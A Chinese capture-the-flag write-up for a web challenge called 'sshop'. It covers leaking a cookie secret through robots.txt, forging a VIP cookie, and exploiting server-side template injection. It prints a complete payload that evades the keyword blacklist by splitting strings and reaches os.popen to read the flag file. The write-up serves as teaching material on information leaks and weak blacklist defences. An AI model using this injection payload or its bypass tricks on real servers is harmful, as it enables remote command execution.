# sshop

## 解题步骤

在 `robots.txt` 中发现隐藏的路由 `/debugggg`，其中泄露了项目的 `cookie_secret`。构造 cookie 伪造 VIP 用户身份，发现新的“编辑个性资料”功能，尝试发现存在模板注入。
在模板注入的时候发现存在黑名单，诸如 "{{" "include" "extend" "os" 等等字符串都会被拦截。
可以通过形如 {% raw *expr* } 的 payload 达到任意命令执行的目的，通过 "o""s" 拼接绕过对 os 的拦截。

最终的 payload：

```
{% raw ().__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13]["ev""al"]("__imp""ort__(\x27o""s\x27).__dict__[\x27po""pen\x27](\x27cat /home/ctf/flag\x27).read()") %}
```

## 设计思路

- 考查对于信息泄露的相关知识，例如 `robots.txt`、`.git` 目录信息泄露等。
- 了解 secret key 的重要性，一旦泄露可能使得攻击者可以伪造签名，导致后续更严重的后果。
- 了解服务端模板注入及其危害
- 了解黑名单防御是不恰当的防御思路，以及如何绕过
